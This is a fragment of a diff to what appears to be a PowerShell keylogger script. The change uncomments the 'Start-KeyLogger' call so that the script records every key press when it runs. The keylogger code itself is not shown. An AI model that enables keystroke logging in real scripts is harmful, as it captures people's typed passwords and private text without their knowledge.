@@ -75,4 +75,4 @@ public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeyst
 
 # records all key presses until script is aborted by pressing CTRL+C
 # will then open the file with collected key codes
-#Start-KeyLogger
+Start-KeyLogger
